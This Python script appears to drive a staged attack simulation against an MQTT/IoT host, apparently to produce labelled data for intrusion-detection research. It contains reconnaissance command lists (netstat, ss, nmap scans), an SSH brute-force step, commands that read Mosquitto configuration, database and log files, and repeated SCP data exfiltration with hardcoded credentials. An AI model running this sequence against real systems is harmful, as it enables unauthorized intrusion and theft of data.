import pickle
import time
from datetime import datetime
import pytz
import apts


def main():
    experiments_details = []
    target = "10.0.0.7"
    username = "ope"
    password = "maint"
    attack_name = "data_exfiltration_sub"
    start_time_all = datetime.now(tz=pytz.UTC)

    # 1) INITIAL ACCESS
    # ----------------------------------------------------------------------------------------------
    commands = "netstat -t;netstat -tuln;ss -tuln;ss -tr;ss -ntr;nmap -T0 -sI -f 192.168.1.0/24;nmap -T5 -sP 192.168.0.0/24;nmap -T5 -sP 10.0.0.0/24;nmap -T5 -sP 192.168.0.0/24"
    command_list = commands.split(";")
    experiment = apts.initial_access(target, 1, command_list, attack_name, sup_conclusion_pause=60)
    experiments_details.append(experiment)

    # 1opt) SSH BRUTEFORCE
    # ----------------------------------------------------------------------------------------------
    experiment = apts.brute_force(1.5, attack_name, 30)
    experiments_details.append(experiment)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "cat /etc/mosquitto/mosquitto.conf;cat /etc/mosquitto/conf.d;cat /var/lib/mosquitto/mosquitto.db;cat /var/log/mosquitto/mosquitto.log; cat /var/log/syslog;cat /var/log/syslog;/usr/bin/nmap -T5 -p 1883,8883 -sV 10.0.0.0/24;sleep 20;nmap -T5 -p 1883,8883 -sV --script banner 10.0.0.0/24; nmap -p 1883,8883 --script mqtt-subscribe 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, 2, command_list2, attack_name, sup_conclusion_pause=60)
    experiments_details.append(experiment)

    # 3) DATA EXFILTRATION FROM SUBSCRIBERS
    # ----------------------------------------------------------------------------------------------
    experiment = apts.exfiltrate_scp(target, username, password, 3, attack_name, 100)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, 4, attack_name, 100)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, 5, attack_name, 100)
    experiments_details.append(experiment)

    time.sleep(150)

    experiment = apts.exfiltrate_scp(target, username, password, 6, attack_name, 100)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, 7, attack_name, 100)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, 8, attack_name, 100)
    experiments_details.append(experiment)

    time.sleep(150)

    experiment = apts.exfiltrate_scp(target, username, password, 9, attack_name, 100)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, 10, attack_name, 100)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, 11, attack_name, 100)
    experiments_details.append(experiment)

    time.sleep(50)

    experiment = apts.exfiltrate_scp(target, username, password, 12, attack_name, 50)
    experiments_details.append(experiment)

    print(experiments_details)
    end_time_all = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": 0,
        "attack_name": "data_exfiltration_sub",
        "phase_name": "all_steps",
        "start_time": start_time_all,
        "end_time": end_time_all
    }
    experiments_details.append(experiment)
    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)
    print(experiments_details)


if __name__ == '__main__':
    main()
